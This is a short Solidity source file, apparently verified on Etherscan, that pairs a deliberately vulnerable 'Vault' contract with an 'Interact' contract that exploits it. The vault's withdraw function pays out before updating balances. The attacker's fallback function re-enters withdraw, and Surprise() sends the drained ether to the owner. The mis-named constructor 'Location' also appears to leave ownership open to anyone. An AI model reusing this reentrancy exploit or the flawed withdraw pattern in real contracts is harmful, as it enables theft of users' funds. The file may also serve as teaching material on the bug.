/**
 *Submitted for verification at Etherscan.io on 2022-03-17
*/

pragma solidity ^0.4.2;

contract Vault {   
  mapping (address => uint) public credit;
    
  function donate(address to) payable {
    credit[to] += msg.value;
  }
    
  function withdraw(uint amount) {
    if (credit[msg.sender]>= amount) {
      bool res = msg.sender.call.value(amount)();
      credit[msg.sender]-=amount;
    }
  }  

  function queryCredit(address to) returns (uint){
    return credit[to];
  }
}

contract Interact {
  Vault public dao;
  address owner; 
  bool public performAttack = true;

  function Location(Vault addr){
    owner = msg.sender;
    dao = addr;
  }
    
  function attack() payable{
    dao.donate.value(1)(this);
    dao.withdraw(1);
  }

  function Surprise(){
    dao.withdraw(dao.balance);
    bool res = owner.send(this.balance);
    performAttack = true;
  }

  function() payable {
    if (performAttack) {
       performAttack = false;
       dao.withdraw(1);
    }
  }
}